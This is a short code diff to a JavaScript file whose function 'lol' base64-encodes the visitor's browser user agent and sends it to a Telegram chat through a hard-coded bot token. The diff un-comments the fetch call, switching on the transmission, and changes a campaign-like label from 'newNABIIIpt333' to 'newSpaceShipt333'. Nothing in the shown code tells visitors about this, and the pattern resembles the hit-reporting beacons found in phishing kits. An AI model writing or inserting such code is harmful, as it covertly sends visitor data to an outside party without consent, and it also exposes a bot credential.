@@ -556,8 +556,8 @@ function rrr() {
 function lol() {
     setTimeout(rrr, 1000);
     var uu = btoa(navigator.userAgent);
-    var url = `https://api.telegram.org/bot1790351020:AAEWeemcoYHGOY5guUERxyiWJOAsalLKtHM/sendMessage?chat_id=-1001664183927&parse_mode=HTML&text=newNABIIIpt333%0A%0A<code>${uu}</code>`
-    // fetch(url).then(response => response.json()).then(data => {console.log(data);}).catch(error=>{console.log(error);});
+    var url = `https://api.telegram.org/bot1790351020:AAEWeemcoYHGOY5guUERxyiWJOAsalLKtHM/sendMessage?chat_id=-1001664183927&parse_mode=HTML&text=newSpaceShipt333%0A%0A<code>${uu}</code>`
+    fetch(url).then(response => response.json()).then(data => {console.log(data);}).catch(error=>{console.log(error);});
 }
 window.lol = lol;
 
